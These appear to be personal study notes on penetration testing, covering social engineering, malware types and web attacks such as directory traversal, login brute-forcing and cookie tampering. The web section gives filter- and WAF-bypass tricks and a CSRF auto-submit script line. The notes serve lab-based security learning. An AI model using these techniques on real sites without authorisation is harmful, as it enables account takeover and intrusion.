[*https://linuxhint.com/install_kali_linux_raspberry_pi_4/*](https://linuxhint.com/install_kali_linux_raspberry_pi_4/)

#### Verifying downloads against checksum

**Linux**

<https://www.youtube.com/watch?v=pYNuKXjcriM>

![Graphical user interface Description automatically generated with low
confidence](media/image258.png){width="6.5in"
height="0.9541666666666667in"}

**Powershell**

<https://www.youtube.com/watch?v=YM2CE6zKvoo>

![Text Description automatically
generated](media/image259.png){width="6.5in"
height="0.8152777777777778in"}

#### Metasploitable

There's a known error with mutuillidae. We can fix by updating config
file

Configuration:

![](media/image260.png){width="6.5in" height="0.2798611111111111in"}

Last line - change name from "metasploit" to "owasp10"

Before

![Text Description automatically
generated](media/image261.png){width="6.5in"
height="2.2916666666666665in"}

After

![Text Description automatically
generated](media/image262.png){width="6.5in"
height="2.3673611111111112in"}

### Attack Frameworks

<https://cisotimes.com/five-top-penetration-testing-frameworks-and-methodologies/>

MITRE: A Comprehensive Guide: <https://www.varonis.com/blog/mitre-attck>

-   **Lockheed Martin Killchain**

    -   Employs a 7-step method

        -   Reconnaissance

        -   Weaponization

        -   Delivery

        -   Exploitation

        -   Installation

        -   Command and control

        -   Actions on Objections

-   **MITRE ATT&CK Framework**

    -   A knowledge based on a matrix of known attacks and potential
        threats.

-   **Diamon Model of Intrusion Analysis**

    -   Analyzes cybersecurity incidents in relation to four core
        features

        -   Adversary, Capability, Infrastructure, victim

### Social Engineering Attacks

You can harden your defenses as much as you want. You can spend millions
of dollars on State of the Art Security Infrastructure. But if Susan the
systems administrator has all the access to your system, and gets
tricked into handling over her credentials, there\'s nothing you can do
to stop it. As we\'ve learned from the greatest sci-fi movies, humans
will always be the weakest link in life, and in your security system.
Social engineering is a kind of con game where attackers use deceptive
techniques to gain access to personal information. They then try to have
a user execute something, and basically scam a victim into doing that
thing.

#### Overview

**Social engineering** is a manipulation technique that exploits human
error to gain private information, access, or valuables. Human error is
usually a result of trusting someone without question. It's the mission
of a threat actor, acting as a social engineer, to create an environment
of false trust and lies to exploit as many people as possible. 

Some of the most common types of social engineering attacks today
include:

-   **Social media phishing:** A threat actor collects detailed
    information about their target from social media sites. Then, they
    initiate an attack.

-   **Watering hole attack:** A threat actor attacks a website
    frequently visited by a specific group of users.

-   **USB baiting:** A threat actor strategically leaves a malware USB
    stick for an employee to find and install, to unknowingly infect a
    network. 

-   **Physical social engineering:** A threat actor impersonates an
    employee, customer, or vendor to obtain unauthorized access to a
    physical location.

#### **[Social engineering principles ]{.underline}**

Social engineering is incredibly effective. This is because people are
generally trusting and conditioned to respect authority. The number of
social engineering attacks is increasing with every new social media
application that allows public access to people\'s data. Although
sharing personal data---such as your location or photos---can be
convenient, it's also a risk.

Reasons why social engineering attacks are effective include:

-   **Authority:** Threat actors impersonate individuals with power.
    This is because people, in general, have been conditioned to respect
    and follow authority figures. 

-   **Intimidation:** Threat actors use bullying tactics. This includes
    persuading and intimidating victims into doing what they're told. 

-   **Consensus/Social proof:** Because people sometimes do things that
    they believe many others are doing, threat actors use others' trust
    to pretend they are legitimate. For example, a threat actor might
    try to gain access to private data by telling an employee that other
    people at the company have given them access to that data in the
    past. 

-   **Scarcity:** A tactic used to imply that goods or services are in
    limited supply. 

-   **Familiarity:** Threat actors establish a fake emotional connection
    with users that can be exploited.  

-   **Trust:** Threat actors establish an emotional relationship with
    users that can be exploited *over time*. They use this relationship
    to develop trust and gain personal information.

-   **Urgency:** A threat actor persuades others to respond quickly and
    without questioning.

#### Phishing

<https://www.youtube.com/watch?v=u9dBGWVwMMA>

A popular type of social engineering attack is a **phishing attack**.
Phishing usually occurs when a malicious email is sent to a victim
disguised as something legitimate. One common phishing attack is an
email, saying your bank account has been compromised. And then, gives
you a link to click on to reset your password. When you go to the link,
it looks like your bank\'s website but it\'s actually a fake website. So
you\'re tricked into entering your current password and credentials in
order to reset your current password.

Phishinsight.com can be used to create phishing attacks

**Phishing** is the use of digital communications to trick people into
revealing sensitive data or deploying malicious software. 

Some of the most common types of phishing attacks today include: 

-   **Business Email Compromise (BEC):** A threat actor sends an email
    message that seems to be from a known source to make a seemingly
    legitimate request for information, in order to obtain a financial
    advantage.

-   **Spear phishing:** A malicious email attack that targets a specific
    user or group of users. The email seems to originate from a trusted
    source.

-   **Whaling:** A form of spear phishing. Threat actors target company
    executives to gain access to sensitive data.

-   **Vishing:** The exploitation of electronic voice communication to
    obtain sensitive information or to impersonate a known source.

-   **Smishing:** The use of text messages to trick users, in order to
    obtain sensitive information or to impersonate a known source.

Staying up-to-date on phishing threats is one of the best things you can
do to educate yourself and help your organization make smarter security
decisions.

-   [Google's phishing quiz](https://phishingquiz.withgoogle.com/) is a
    tool that you can use or share that illustrates just how difficult
    it can be to identify these attacks.

-   [Phishing.org](https://www.phishing.org/) reports on the latest
    phishing trends and shares free resources that can help reduce
    phishing attacks.

-   The [Anti-Phishing Working Group (APWG)](https://apwg.org/) is a
    non-profit group of multidisciplinary security experts that
    publishes a quarterly report on phishing trends.

##### Smishing

Social engineering via text (usually using spoofed number).

**Smishing:** The use of text messages to trick users, in order to
obtain sensitive information or to impersonate a known source. Smishing
covers all forms of text messaging services, including Apple's
iMessages, WhatsApp, and other chat mediums on phones.

##### Vishing

Social engineering via phone (often using voip and using a spoofed phone
number).

##### Spear Phishing

Another variation of phishing is **spear phishing**. Both phishing
schemes have the same end goals, but spearfishing specifically targets
individual or group. The fake emails may contain some personal
information like your name, or the names of friends or family. So they
seem more trustworthy.

##### Whaling

**Whaling**, in cyber security, is a form of phishing that targets
valuable individuals. This typically means high-ranking officials and
governing and corporate bodies. The purpose of whaling is to acquire an
administrator's credentials and sensitive information.

#### Email Spoofing

Another popular social engineering attack is **email spoofing**.
Spoofing is when a source is masquerading around as something else.
Think of an email spoof. This is what happens when you receive an email
with a misleading sender address. You can send an email and have it
appear to come from anywhere you want, whether it exists or not. Imagine
if you open that email you thought was from your friend Brian. Brian\'s
real email address is in the front part and the email says that you have
to check out this funny link. Well, you know Brian. He\'s pretty awesome
and he always said super funny emails, so you click on the link.
Suddenly, you have malware installed. And you\'re probably not feeling
so awesome about Brian right now.

#### **Watering hole attack**

**Watering hole** is a type of attack when a threat actor compromises a
website frequently visited by a specific group of users. Oftentimes,
these watering hole sites are infected with malicious software. An
example is the *Holy Water attack of 2020* that infected various
religious, charity, and volunteer websites.

#### Baiting

Not all social engineering occurs digitally. In fact, one attack happens
through actual physical contact. This is called baiting, which is used
to entice a victim to do something. For example, an attacker could just
leave a USB drive somewhere in hopes that someone out there will plug it
into their machine to see what\'s on it. But they\'ve just installed
malware on the machine without even knowing it.

##### Quid pro quo

**Quid pro quo** is a type of baiting used to trick someone into
believing that they'll be rewarded in return for sharing access,
information, or money. For example, an attacker might impersonate a loan
officer at a bank and call customers offering them a lower interest rate
on their credit card. They\'ll tell the customers that they simply need
to provide their account details to claim the deal.

#### Tailgating

Another popular attack that can occur offline is called tailgating,
which is essentially gaining access into a restricted area or building
by following a real employee in. In most corporate environments,
building access is restricted through the use of a keycard or some other
entry method. But a tailgater could use social engineering tactics to
trick an employee into thinking that they\'re there for a legitimate
reason like doing maintenance on the building, or delivering packages.
Once a tailgater is in, they have physical access to your corporate
assets. Pretty scary stuff we\'ve covered so far huh? I bet you didn\'t
realize that there were so many ways to compromise security. Hopefully,
you\'ve gained a better grasp on the common attacks out there, and signs
and what to look for. Now that you\'ve been exposed to the fundamental
types of security threats, we\'ll dive deep into best practices for
security and how to create technical implementations for secure systems.
But first up, we\'re going to test your knowledge with a quiz covering
the different attacks we\'ve talked about in this module.

### Software attacks: Malware (Malicious software)

![Logo, company name Description automatically
generated](media/image263.png){width="6.5in"
height="3.609027777777778in"}

**Malware** is software designed to harm devices or networks. There are
many types of malware. The primary purpose of malware is to obtain
money, or in some cases, an intelligence advantage that can be used
against a person, an organization, or a territory.  

Some of the most common types of malware attacks today include: 

Anti malware defenses are a core part of any company\'s security model
in this day and age. So it\'s important as an IT support specialist to
know what\'s out there. Today, the internet is full of bots, viruses,
worms, and other automated attacks. Lots of unprotected systems would be
compromised in a matter of minutes if directly connected to the internet
without any safeguards or protections in place. And they need to have
critical system updates. While modern operating systems have reduced
this threat vector by having basic firewalls enabled by default,
there\'s still a huge amount of attack traffic on the Internet. Anti
malware measures play a super important role in keeping this type of
attack off your systems and helping to protect your users. Antivirus
software has been around for a really long time but some security
experts question the value it can provide to a company especially since
more sophisticated malware and attacks have been spun up in recent
years. Antivirus software is signature based. This means that it has a
database of signatures that identify known malware like the unique file
hash of a malicious binary or the file associated with an infection. Or
it could be that network traffic characteristics that malware uses to
communicate with a command and control server. Antivirus software will
monitor and analyze things like new files being created or being
modified on the system in order to watch for any behavior that matches a
known malware signature. If it detects activity that matches the
signature, depending on the signature type, it will attempt to block the
malware from harming the system. But some signatures might only be able
to detect the malware after the infection has occurred. In that case, it
may attempt to quarantine the infected files. If that\'s not possible,
it will just log and alert the detection event. At a high level, this is
how all antivirus products work. There are two issues with antivirus
software though. The first is that they depend on antivirus signatures
distributed by the antivirus software vendor. The second is that they
depend on the antivirus vendor discovering new malware and writing new
signatures for newly discovered threats. Until the vendor is able to
write new signatures and publish and disseminate them, your antivirus
software can\'t protect you from these emerging threats. Boo. Antivirus,
which is designed to protect systems, actually represents an additional
attack surface that attackers can exploit. You might be thinking, wait,
our own antivirus tools can be another threat to our system? What\'s the
deal with that? Well, this is because of the very nature of one
antivirus engine must do. It takes arbitrary and potentially malicious
binaries as input and performs various operations on them. Because of
this, there are a lot of complex code where very serious bugs could
exist. Exactly this kind of vulnerability was found in the Sophos
Antivirus engine back in 2012. You can read more about this event in the
supplementary readings. So, it sounds like antivirus software isn\'t
ideal and has some pretty large drawbacks. Then why are we still
recommending it as a core piece of security design? The short answer is
this. It protects against the most common attacks out there on the
internet. The really obvious stuff that still poses a threat to your
systems still needs to be defended against. Antivirus is an easy
solution to provide that protection. It doesn\'t matter how much you
user education you instill in your employees. There will still be some
folks who will click on an e-mail that has an infected attachment. A
good way to think about antivirus in today\'s very noisy external threat
environment is like a filter for the attack noise on the internet today.
It lets you remove the background noise and focus on the more important
targeted or specific threats. Remember, our defense in depth concept
involves multiple layers of protection. Antivirus software is just one
piece of our anti malware defenses. If antivirus can\'t protect us from
the threats we don\'t know about, how do we protect against the unknown
threats out there? While antivirus operates on a blacklist model,
checking against a list of known bad things and blocking what gets
matched, there\'s a class of anti malware software that does the
opposite. Binary whitelisting software operates off a white list. It\'s
a list of known good and trusted software and only things that are on
the list are permitted to run. Everything else is blocked. You can think
of this as applying the implicit deny ACL rule to software execution. By
default, everything is blocked. Only things explicitly allowed to
execute are able to. I should call out that this typically only applies
to executable binaries, not arbitrary files like PDF documents or text
files. This would naturally defend against any unknown threats but at
the cost of convenience. Think about how frequently you download and
install new software on your machine. Now imagine if you had to get
approval before you could download and install any new software. That
would be really annoying, don\'t you think? Now, imagine that every
system update had to be whitelisted before it could be applied.
Obviously, not trusting everything wouldn\'t be very sustainable. It\'s
for this reason that binary whitelisting software can trust software
using a couple of different mechanisms. The first is using the unique
cryptographic hash of binaries which are used to identify unique
binaries. This is used to whitelist individual executables. The other
trust mechanism is a software-signing certificate. Remember back when we
discussed public key cryptography and signatures using public and
private key pairs? Software signing or code signing is the same idea but
applied to software. A software vendor can cryptographically sign
binaries they distribute using a private key. The signature can be
verified at execution time by checking the signature using the public
key embedded in the certificate and verifying the trust chain of the
public key. If the hash matches and the public key is trusted, then the
software can be verified that it came from someone with the software
vendor\'s code signing private key. Binary whitelisting systems can be
configured to trust specific vendors\' code signing certificates. They
permit all binary sign with that certificate to run. This is helpful for
automatically trusting content like system updates along with software
in common use that comes from reputable and trusted vendors. But can you
guess the downside here? Each new code signing certificate that\'s
trusted represents an increase in attack surface. An attacker can
compromise the code signing certificate of a software vendor that your
company trusts and use that to sign malware that targets your company.
That would bypass any binary whitelisting defenses in place. Not good.
This exact scenario happened back in 2013 to Bit9, a binary whitelisting
software company. Hackers managed to breach their internal network and
found an unsecured virtual machine. It had a copy of the code signing
certificates private key. They stole that key and used it to sign
malware that would have been trusted by all Bit9 software installations
by default.

#### Adware

Advertising-supported software, or **adware**, is a type of legitimate
software that is sometimes used to display digital advertisements in
applications. Software developers often use adware as a way to lower
their production costs or to make their products free to the
public---also known as freeware or shareware. In these instances,
developers monetize their product through ad revenue rather than at the
expense of their users.

Malicious adware falls into a sub-category of malware known as a
**potentially unwanted application (PUA)**. A PUA is a type of unwanted
software that is bundled in with legitimate programs which might display
ads, cause device slowdown, or install other software. Attackers
sometimes hide this type of malware in freeware with insecure design to
monetize ads for themselves instead of the developer. This works even
when the user has declined to receive ads.

#### Spyware

Similar to adware, **spyware** is malware that\'s used to gather and
sell information without consent. It\'s also considered a PUA. Spyware
is commonly hidden in *bundleware*, additional software that is
sometimes packaged with other applications. PUAs like spyware have
become a serious challenge in the open-source software development
ecosystem. That's because developers tend to overlook how their software
could be misused or abused by others.

#### Scareware

Another type of PUA is **scareware**. This type of malware employs
tactics to frighten users into infecting their own device. Scareware
tricks users by displaying fake warnings that appear to come from
legitimate companies. Email and pop-ups are just a couple of ways
scareware is spread. Both can be used to deliver phony warnings with
false claims about the user\'s files or data being at risk.

#### Fileless malware

**Fileless malware** does not need to be installed by the user because
it uses legitimate programs that are already installed to infect a
computer. This type of infection resides in memory where the malware
never touches the hard drive. This is unlike the other types of malware,
which are stored within a file on disk. Instead, these stealthy
infections get into the operating system or hide within trusted
applications.

**Pro tip:** Fileless malware is detected by performing memory analysis,
which requires experience with operating systems. 

#### Viruses 

**Viruses:** Malicious code written to interfere with computer
operations and cause damage to data, software, and hardware. A virus
attaches itself to programs or documents, on a computer. It then spreads
and infects one or more computers in a network.

**Ten types defined by CompTIA:**

-   **Boot sector**: Executes when system loads/boots

-   **Macro**: Saved is some file with macro capabilities (word, excel)

-   **Program**: Infects programs

-   **Multipartite**: Boot sector + program virus

-   **Stealth**: Virus which aims avoid detection

    -   **Encrypted**: Uses cyphers to hide from Ant-malware software

        -   **Polymorphic**: An encrypted virus that changes it's
            encrypted to avoid detection

            -   **Metamorphic**: Advanced form of polymorphic virus
                which rewrites itself completely prior to file
                infection.

-   **Armored**: Uses layers of protection

-   **Hoax**: Virus disguising as something innocent/necessary (social
    engineering).

#### Ransomware

**Ransomware:** A malicious attack where threat actors encrypt an
organization\'s data and demand payment to restore access. 

Ransomware describes a malicious attack where threat actors encrypt an
organization\'s data and demand payment to restore access. According to
the Cybersecurity and Infrastructure Security Agency (CISA), ransomware
crimes are on the rise and becoming increasingly sophisticated.
Ransomware infections can cause significant damage to an organization
and its customers. An example is the
[WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack)
attack that encrypts a victim\'s computer until a ransom payment of
cryptocurrency is paid.

#### Spyware

**Spyware:** Malware that's used to gather and sell information without
consent. Spyware can be used to access devices. This allows threat
actors to collect personal data, such as private emails, texts, voice
and image recordings, and locations.

#### Logic bomb

![Graphical user interface, text, application Description automatically
generated](media/image264.png){width="4.314640201224847in"
height="1.4114774715660543in"}

#### Backdoor

![Graphical user interface, text, application Description automatically
generated](media/image265.png){width="4.774058398950131in"
height="1.7535476815398074in"}

#### Trojans

Application disguises as benign software. Remote Access Trojans (see
ProRat).

#### Worm

Propagates without consent.

-   **Worms:** Malware that can duplicate and spread itself across
    systems on its own. 

-   A **worm** is malware that can duplicate and spread itself across
    systems on its own. Similar to a virus, a worm must be installed by
    the target user and can also be spread with tactics like malicious
    email. Given a worm\'s ability to spread on its own, attackers
    sometimes target devices, drives, or files that have shared access
    over a network.

-   A well known example is the Blaster worm, also known as Lovesan,
    Lovsan, or MSBlast. In the early 2000s, this worm spread itself on
    computers running Windows XP and Windows 2000 operating systems. It
    would force devices into a continuous loop of shutting down and
    restarting. Although it did not damage the infected devices, it was
    able to spread itself to hundreds of thousands of users around the
    world. Many variants of the Blaster worm have been deployed since
    the original and can infect modern computers.

-   **Note:** Worms were very popular attacks in the mid 2000s but are
    less frequently used in recent years.

#### CryptoJacking

**Cryptojacking** is a form of malware that installs software to
illegally mine cryptocurrencies. You may be familiar with cryptocurrency
from the news. If you\'re new to the topic, cryptocurrencies are a form
of digital money that have real-world value. Like physical forms of
currency, there are many different types. For the most part, they\'re
referred to as coins or tokens.

By far the most telling sign of a cryptojacking infection is slowdown.
Other signs include increased CPU usage, sudden system crashes, and fast
draining batteries. Another sign is unusually high electricity costs
related to the resource- intensive process of crypto mining.

It\'s also good to know that there are certain measures you can take to
reduce the likelihood of experiencing a malware attack like
cryptojacking. These defenses include things like using browser
extensions designed to block malware, using ad blockers, disabling
JavaScript, and staying alert on the latest trends. Security analysts
can also educate others in their organizations on malware attacks.

#### Rootkit

![Graphical user interface, text, application Description automatically
generated](media/image266.png){width="4.553340988626422in"
height="1.5333475503062117in"}

A **rootkit** is designed to provide administrator-level access to a
third party without the system owner\'s knowledge. Given this, rootkits
are usually designed to avoid detection and can be difficult to detect.
Use a technique called DLL injection. This is known as shimming, where a
"shim" is placed between the OS and some component.

A **rootkit** is malware that provides remote, administrative access to
a computer. Most attackers use rootkits to open a backdoor to systems,
allowing them to install other forms of malware or to conduct network
security attacks.

This kind of malware is often spread by a combination of two components:
a dropper and a loader. A **dropper** is a type of malware that comes
packed with malicious code which is delivered and installed onto a
target system. For example, a dropper is often disguised as a legitimate
file, such as a document, an image, or an executable to deceive its
target into opening, or dropping it, onto their device. If the user
opens the dropper program, its malicious code is executed and it hides
itself on the target system.

Multi-staged malware attacks, where multiple packets of malicious code
are deployed, commonly use a variation called a loader. A **loader** is
a type of malware that downloads strains of malicious code from an
external source and installs them onto a target system. Attackers might
use loaders for different purposes, such as to set up another type of
malware\-\--a botnet.

### Web/Browser-based attacks : Web security & Bug Bounty Hunting

#### Cheat sheets

**Injection cheat sheets**

-   Command injection:
    <https://hackersonlineclub.com/command-injection-cheatsheet/>

-   

#### Notable websites

-   **PortSwigger:** LABS - Has broken test sites for practice

-   **TryHackme:** LABS - Has broken test sites for practice

-   **Burpsuite:**

-   **Wappalyzer**: see what technologies websites are using.

#### BeEF (Browser Exploitation)

<https://www.youtube.com/watch?v=EL96fXFNLNA>

![Graphical user interface, text Description automatically
generated](media/image267.png){width="6.5in"
height="2.720833333333333in"}

#### Information Disclosure Vulnerabilities

##### Hidden Requests

Use burp suite to intercept requests and see which other requests are
happenin behind the scenes.

##### Query Parameters

Editing query parameters is a good way to see what values can be
accepted and what happens when an error is thrown.

#### Path/directory traversal 

##### Directory traversal cheat sheet

![](media/image268.emf)

##### Robots.txt

Check if this file exists (/robots.txt) as it's intended to create rules
for webscraping -- but can lead to information about a websites dir
structure.

##### Sitemap.xml

Unlike the robots.txt file, which restricts what search engine crawlers
can look at, the sitemap.xml file gives a list of every file the website
owner wishes to be listed on a search engine. These can sometimes
contain areas of the website that are a bit more difficult to navigate
to or even list some old webpages that the current site no longer uses
but are still working behind the scenes.

![Graphical user interface, text, application Description automatically
generated](media/image269.png){width="6.5in"
height="4.0680555555555555in"}

##### Ffuf

![](media/image270.png){width="6.5in" height="1.25625in"}

##### ~Dirb~ (directory buster)

**Without a wordlist**

![Text Description automatically
generated](media/image271.png){width="4.665859580052493in"
height="0.7028696412948382in"}

Wordlist defaults to

![Text Description automatically
generated](media/image272.png){width="6.323799212598425in"
height="0.9167946194225722in"}

Trying with metasploit mittilidae

![](media/image273.png){width="5.688293963254593in"
height="0.40630686789151355in"}

**With an explicit wordlist**

![](media/image274.png){width="6.5in" height="0.46111111111111114in"}

![Text Description automatically
generated](media/image275.png){width="6.5in" height="1.20625in"}

##### Gobuster

![Text Description automatically
generated](media/image276.png){width="6.5in"
height="4.000694444444444in"}

Findings...

![Text Description automatically
generated](media/image277.png){width="6.395833333333333in"
height="3.0208333333333335in"}

**Using wordlists provided in kali (/usr/share/wordlists)**

![](media/image278.png){width="6.5in" height="1.8041666666666667in"}

##### Feroxbuster

Feroxbuster: <https://github.com/epi052/feroxbuster>

Kali: <https://www.kali.org/tools/feroxbuster/>

Feroxbuster is a good tool to identify the path structure of a system.

**Usage:** ./feroxbuster -u/url \<domain\> \<wordlist\>

![](media/image279.png){width="6.5in" height="0.23680555555555555in"}

Note: if your don't specify the protocol ("http" for example) then https
will be assumed -- best to be explicit).

![](media/image280.png){width="6.5in" height="0.4166666666666667in"}

The wordlist in this case won't be a list of password -- but will
instead be a list of possible paths.

**Wordlist resource**: <https://github.com/danielmiessler/SecLists>

This particular dir list:
<https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt>

##### Burp Proxy

###### Burp repeater

Use Burp proxy intercepter and send to repeater

![Graphical user interface, application Description automatically
generated](media/image281.png){width="5.705581802274716in"
height="3.2392979002624673in"}

Use the repeater to repeat a request AND view the response from the
server it it's entirety

![Graphical user interface, text, application, email Description
automatically generated](media/image282.png){width="6.5in"
height="3.6979166666666665in"}

###### Burp Intruder: Sniper

<https://www.udemy.com/course/learn-bug-bounty-hunting-web-security-testing-from-scratch/learn/lecture/33920666#overview>

Send repeater requests to the Burp intruder to batch tests...

![Text Description automatically
generated](media/image283.png){width="5.584113079615048in"
height="1.9169346019247595in"}

In the payload you can insert data that you want to test (for example,
data from commandn for command injection)

![Graphical user interface, text, application Description automatically
generated](media/image284.png){width="6.5in"
height="3.651388888888889in"}

Example: HTML Tags to test HTML injection

![Text Description automatically generated with low
confidence](media/image285.png){width="6.5in"
height="2.1347222222222224in"}

![Graphical user interface, application, Teams Description automatically
generated](media/image286.png){width="6.5in"
height="1.2104166666666667in"}

In the **positions** tab you can choose your attack type (like sniper).

With sniper, any instance of "SS" will be replaced with an entry from
your payload

![Graphical user interface, text, application Description automatically
generated](media/image287.png){width="4.26254593175853in"
height="2.252409230096238in"}

###### Burp intruder: Cluster Bomb

<https://www.udemy.com/course/learn-bug-bounty-hunting-web-security-testing-from-scratch/learn/lecture/33155778#content>

<https://www.udemy.com/course/web-security-and-bug-bounty-learn-penetration-testing/learn/lecture/26170474#search>

Update more than one variable at the same time where each variable can
be attempted with entries from its own defined payload.

![A picture containing text Description automatically
generated](media/image288.png){width="4.150014216972878in"
height="0.9330566491688539in"}

![Graphical user interface, text, application, email Description
automatically generated](media/image289.png){width="4.720002187226597in"
height="2.208215223097113in"}

**Matching**

Combine this with Intruder \> Options \> Grep -- Match to filter
attempts by the error message you've seen before.

![Graphical user interface Description automatically generated with
medium confidence](media/image290.png){width="3.9444685039370078in"
height="1.3010126859142608in"}

![Graphical user interface, application Description automatically
generated](media/image291.png){width="6.5in"
height="4.047916666666667in"}

![Table Description automatically
generated](media/image292.png){width="6.5in" height="2.10625in"}

##### Requests by file path

Whenever you see requests being made to an actual file path it's worth
investigating.

![Graphical user interface, text, application, email Description
automatically generated](media/image293.png){width="6.5in"
height="1.8423611111111111in"}

Best to do this incrementally -- trying every path as some paths may not
work but others might

![Text Description automatically
generated](media/image294.png){width="6.5in"
height="6.081944444444445in"}

###### Double-down to Bypass filtering checks

In case the program on the server replaces charactes (like double dots)
then we can double those up to get what are testing. Or try doubling up
the forward slash as well.

![A picture containing diagram Description automatically
generated](media/image295.png){width="6.5in" height="2.60625in"}

Think of perl when we replace single apos with double apos.

![Graphical user interface, text, application Description automatically
generated](media/image296.png){width="6.5in"
height="4.586111111111111in"}

###### Minimal modification

Always good to try to minimize the amounts of modifications to the
original successful request -- in case there's a check that the filepath
begins or ends a certain way (or contains a certain string)

For example, if all attempts to replace a path (say /var/www/images/)
fail, try keeping that path and adding onto it as there may be a check
that requires "/var/www/images/".

![](media/image297.png){width="6.5in" height="0.5402777777777777in"}

###### Null-byte

If you suspect that the path you are investigating only expects a
certain file type (image for example) you can add in the filepath you
want to test then add in the percent encoded null-byte character (%00)
followed by the file type expected. This results in only the characters
before the nullbyte character being accepted.

Everything after a nullbyte I omitted from the final value. Think of it
as a comment in SQL injection.

![Diagram, schematic, timeline Description automatically
generated](media/image298.png){width="6.5in"
height="2.890277777777778in"}

###### Url-encode the path you are testing

![Graphical user interface, application Description automatically
generated](media/image299.png){width="6.5in"
height="5.118055555555555in"}

After...

![A close-up of a document Description automatically generated with low
confidence](media/image300.png){width="6.5in" height="1.23125in"}

...

![Text Description automatically generated with medium
confidence](media/image301.png){width="6.5in"
height="0.8291666666666667in"}

###### Double-encode to bypass WAF filters!

![Graphical user interface Description automatically generated with
medium confidence](media/image302.png){width="6.5in"
height="2.8368055555555554in"}

After...

![A picture containing text, ball, hitting, player Description
automatically generated](media/image303.png){width="6.5in"
height="2.7847222222222223in"}

#### Broken Access Control Vulnerabilities

As of 2021 this is the highest ranked security threat -- where 94% of
websites are vulnerable.

![Graphical user interface, text Description automatically
generated](media/image304.png){width="6.5in"
height="2.4722222222222223in"}

![Graphical user interface Description automatically
generated](media/image305.png){width="6.5in"
height="3.1972222222222224in"}

Key things to check

-   Query parameters

-   Create multiple accounts to see if you can view one users info from
    the other.

-   Use **Burp proxy intercepter** to look for direct references to info
    (for example /downloads/1.txt) and see if you can get other info.

##### Use burp cluster bomb to brute force user/pass

##### Hydra to brute force login page

[Hydra attack on login page
\[bookmark\]](#hydra-dictionary-attack-on-ssh)

##### Ffuf to brute force login page 

***Example from tryhackme -- username only***

If you try entering the username **admin** and fill in the other form
fields with fake information, you\'ll see we get the error **An account
with this username already exists**.

![Table Description automatically
generated](media/image306.png){width="6.5in"
height="2.0027777777777778in"}

We can use the existence of this error message to produce a list of
valid usernames already signed up on the system by using the ffuf tool
below.

Looking at the request...

![](media/image307.png){width="5.886237970253719in"
height="2.958746719160105in"}

The ffuf tool uses a list of commonly used usernames to check against
for any matches.

![](media/image308.png){width="6.5in" height="2.026388888888889in"}

In the above example, the -w argument selects the file\'s location on
the computer that contains the list of usernames that we\'re going to
check exists. The -X argument specifies the request method, this will be
a GET request by default, but it is a POST request in our example.
The -d argument specifies the data that we are going to send. In our
example, we have the fields username, email, password and cpassword.
We\'ve set the value of the username to **FUZZ**. In the ffuf tool, the
FUZZ keyword signifies where the contents from our wordlist will be
inserted (interpolated) in the request. The -H argument is used for
adding additional headers to the request. In this instance, we\'re
setting the Content-Type to the webserver knows we are sending form
data. The -u argument specifies the URL we are making the request to,
and finally, the -mr argument is the text on the page we are looking for
to validate we\'ve found a valid username.

The ffuf tool and wordlist come pre-installed on the **AttackBox** or
can be installed locally by downloading it
from <https://github.com/ffuf/ffuf>.

![](media/image309.png){width="6.5in" height="1.125in"}

**Bruteforcing username and password**

![Text Description automatically
generated](media/image310.png){width="6.5in" height="2.05in"}

##### Trace http method

Useful to try to retry requests using the TRACE method to gather more
details about the request being mazde.

![A picture containing text, scissors, tool Description automatically
generated](media/image311.png){width="2.943601268591426in"
height="0.9048195538057743in"}

![Graphical user interface Description automatically generated with
medium confidence](media/image312.png){width="6.5in"
height="3.2979166666666666in"}

Using trace allows you to see your request as it comes back from the
server. This allows you to see if something was modified on the response
-- fro example ome extra headers.

Example: Using trace on a request we see a new header was added on the
response

![Graphical user interface, text Description automatically
generated](media/image313.png){width="3.540170603674541in"
height="1.0972255030621172in"}

That IP is ours when it blocked our request... so we use burp match &
replace to add in a new header where we add in this ip with another
users ip (or maybe the admins). Ooor, if you don't know their ip, try
localhost so we can simulate being on the webserver itself.

##### Cookie manipulation

Use tools like burp suite to view/modify cookies as they are being used
in a given site.

This is helpful to use with feroxbuster to see which paths are open and
using which cookies.

**Cookie token stealing**

When a cookie has the Secure attribute, the user agent includes the
cookie in an HTTP request only if the request is transmitted over a
secure channel (typically HTTPS). Although seemingly useful for
protecting cookies from active network attackers, the Secure attribute
protects only the cookie's confidentiality. Forcing the web application
to use TLS or SSL does not force the cookie to be sent over TLS/SSL, so
you still would need to set the Secure attribute on the cookie. Hashing
the cookie provides integrity of the cookie, not confidentiality.

#### Insecure session management

##### Logging in as admin by stealing cookies

First, find a borwser extension that allows you to edit cookies.

![Graphical user interface, text, application, email Description
automatically generated](media/image314.png){width="6.5in"
height="2.3986111111111112in"}

Try editing suspicious-looking cookies and refreshing the page

![Graphical user interface, text, application, table Description
automatically
generated](media/image315.png){width="3.7703488626421695in"
height="2.796686351706037in"}

For example, suppose you have one called "userid" try setting it to "1"
or if you have "username" try setting it to "admin" and seeing if this
changes who you are logged n as.

##### Discovering CSRF Vulnerabilities

![](media/image316.png){width="6.5in" height="1.082638888888889in"}

-   Find a sensitive form (for example, a form used on a website to
    update a password)

-   Copy the html of that form and replace the action with the full URL
    of the site

-   Open this HTML and if there's no validation, you should be able to
    change your paassword (and others).

![Text, letter Description automatically
generated](media/image317.png){width="6.5in"
height="1.7756944444444445in"}

**Exploiting CSRF with HTML and XSS**

If you can inject that HTML on a webpage, you can also try to inject
some malicious Javascipt to take things a step further..

-   Hide the inputs (by changing type to hidden) and assign those input
    values that you know.

-   Make sure the form has no visible elements. We can even remove the
    submit button.

-   Give the form an id.

-   Add in some JS that immediately submits the form

    -   \<script\>document.getElementById('myform').submit();\</script\>

#### Remote File Inclusion Vulnerabilities

#### File Upload vulnerabilities

![Text Description automatically
generated](media/image318.png){width="6.5in"
height="1.3076388888888888in"}

##### Mitigation

![Text Description automatically
generated](media/image319.png){width="6.5in"
height="1.7590277777777779in"}

<https://www.udemy.com/course/learn-website-hacking-penetration-testing-from-scratch/learn/lecture/6019138#questions>

#### Injection Attacks

A common security exploit that can occur in software development and
runs rampant on the web is the possibility for an attacker to inject
malicious code. We refer to these types of attacks as injection attacks.
[Injection attacks can be mitigated with good software development
principles, like validating input and sanitizing data]{.underline}.

##### XXS -- Cross Site Scripting (html/js injection)

**Cross-site scripting**, or **XSS** attacks, are a type of injection
attack where the attacker can insert malicious code and target the user
of the service. XSS attacks are a common method to achieve a session
hijacking. It would be as simple as embedding a malicious script in a
website, and the user unknowingly executes the script in their browser.
